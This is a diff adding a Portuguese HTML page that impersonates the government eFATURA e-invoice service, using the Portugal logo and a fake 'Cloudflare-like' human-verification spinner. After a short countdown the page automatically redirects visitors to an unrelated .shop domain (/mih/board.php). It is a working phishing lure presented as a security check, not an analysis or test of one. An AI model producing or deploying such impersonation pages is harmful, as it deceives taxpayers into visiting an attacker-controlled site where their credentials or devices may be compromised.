@@ -1,0 +1,182 @@
+﻿<!DOCTYPE html>
+<html lang="pt-PT">
+<head>
+  <meta charset="UTF-8" />
+  <title>Verificação de Segurança - eFATURA</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: Inter, Arial, sans-serif;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      background: linear-gradient(135deg, #1e3c72, #6a1fbf);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .card {
+      width: 420px;
+      background: #ffffff;
+      border-radius: 16px;
+      padding: 32px 28px;
+      box-shadow: 0 25px 60px rgba(0,0,0,0.25);
+      text-align: center;
+    }
+
+    .portugal-logo {
+      width: 120px;
+      margin: 0 auto 20px;
+      display: block;
+    }
+
+    .header-container {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 16px;
+      margin-bottom: 20px;
+    }
+
+    .robot {
+      width: 60px;
+      height: 60px;
+    }
+
+    .badge {
+      background: #6c63ff;
+      color: #fff;
+      font-size: 12px;
+      padding: 6px 14px;
+      border-radius: 999px;
+    }
+
+    h1 {
+      font-size: 22px;
+      margin: 10px 0;
+      color: #1f2937;
+    }
+
+    .subtitle {
+      font-size: 14px;
+      color: #6b7280;
+      margin-bottom: 22px;
+    }
+
+    .alert {
+      background: #fff7ed;
+      border: 1px solid #fed7aa;
+      border-radius: 8px;
+      padding: 14px;
+      font-size: 13px;
+      color: #92400e;
+      display: flex;
+      gap: 10px;
+      margin-bottom: 22px;
+      text-align: left;
+    }
+
+    .status {
+      font-size: 14px;
+      color: #2563eb;
+      margin-top: 12px;
+      min-height: 24px;
+    }
+
+    .spinner {
+      width: 18px;
+      height: 18px;
+      border: 3px solid #e5e7eb;
+      border-top: 3px solid #6c63ff;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      display: inline-block;
+      vertical-align: middle;
+      margin-right: 8px;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .footer {
+      margin-top: 16px;
+      font-size: 11px;
+      color: #6b7280;
+    }
+
+    @media (max-width: 480px) {
+      .card {
+        width: 92%;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+
+    <img src="https://www.gov.pt/module/header/assets/header-images/logo_Portugal.svg"
+         alt="Logótipo de Portugal"
+         class="portugal-logo">
+
+    <div class="header-container">
+      <svg class="robot" viewBox="0 0 64 64">
+        <rect x="14" y="18" width="36" height="30" rx="6" fill="#6c63ff"/>
+        <circle cx="26" cy="32" r="3" fill="#fff"/>
+        <circle cx="38" cy="32" r="3" fill="#fff"/>
+      </svg>
+      <div class="badge">Faturas sem papel</div>
+    </div>
+
+    <h1>Verificação de Segurança</h1>
+
+    <div class="subtitle">
+      A validar automaticamente o acesso ao documento fiscal eletrónico.
+    </div>
+
+    <div class="alert">
+      ⚠️ Esta verificação protege os dados fiscais contra acessos automatizados
+      e atividades suspeitas.
+    </div>
+
+    <div class="status" id="status">
+      <span class="spinner"></span>
+      A verificar comportamento humano...
+    </div>
+
+    <div class="footer">
+      🔒 Protegido por sistema automático de verificação
+    </div>
+
+  </div>
+
+  <script>
+    const status = document.getElementById('status');
+    let seconds = 3;
+
+    // Simulação de análise inicial (Cloudflare-like)
+    setTimeout(() => {
+      status.textContent = `✔ Verificado! A redirecionar em ${seconds}...`;
+
+      const interval = setInterval(() => {
+        seconds--;
+
+        if (seconds > 0) {
+          status.textContent = `✔ Verificado! A redirecionar em ${seconds}...`;
+        } else {
+          clearInterval(interval);
+          window.location.href = "https://resolucaocomputadoreconpizarra.shop/mih/board.php";
+        }
+      }, 1000);
+
+    }, 1400); // atraso intencional
+  </script>
+
+</body>
+</html>
